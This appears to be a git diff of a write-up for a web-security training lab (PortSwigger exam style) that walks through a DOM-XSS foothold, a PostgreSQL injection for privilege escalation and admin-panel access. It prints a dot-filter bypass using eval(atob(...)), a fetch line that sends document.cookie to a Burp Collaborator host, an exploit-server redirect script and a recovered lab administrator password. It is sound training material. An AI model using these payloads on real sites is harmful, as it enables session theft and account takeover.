@@ -1,19 +1,36 @@
+# Foothold
+
 Active Scan => DOM-XSS => "-alert(1)-"
 
-dots are blocked => first bypass to get cookie => alert([document][cookie]) cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.
+![image](https://user-images.githubusercontent.com/40497633/233626048-0866c789-cc7c-4278-ae84-721bbfa8ef41.png)
+
+
+dots are blocked => first bypass to get cookie => alert(document['cookie']) cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.
+![image](https://user-images.githubusercontent.com/40497633/233626299-da46ddec-1288-49fe-a557-3380039229c0.png)
+
+![image](https://user-images.githubusercontent.com/40497633/233626763-d3d2cd7d-1359-4f72-8ba5-f295416ce4c0.png)
+
 
 Exploit:
-"-eval(atob('ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ=='))-"
+"-eval(atob('[base64 encoded payload]'))-"
 
-base64 part:
+base64 payload:
 fetch('https://your.burp.oastify.com?cookie='+document.cookie)
+![image](https://user-images.githubusercontent.com/40497633/233627758-d03b4789-a4b6-4df0-a91e-d4fde369023a.png)
 
 Exploit server:
 <script>
-    document.location="https://LAB-ID.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==%27))-%22czichiz"
+    document.location="https://LAB-ID.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27[base64 encoded payload]%27))-%22czichiz"
 </script>
 
+![image](https://user-images.githubusercontent.com/40497633/233628564-3c1729fa-30c9-41d2-9edd-89d1cbcf82a9.png)
+
 Carlos account takeover!
+
+![image](https://user-images.githubusercontent.com/40497633/233628748-0e921ccd-22d8-4042-a212-9b277b44de73.png)
+
+
+# Privesc
 
 Active scan on new advanced search feature only accessible with user account => PostgreSQL injection on param sort-by
 
@@ -45,6 +62,8 @@ login: administrator
 password: b9v9whchewypewtl1ygv
 
 Administrator account takeover!
+
+# Data exfiltration
 
 New feature => admin panel => delete users => list of blogs with title/author/views
 
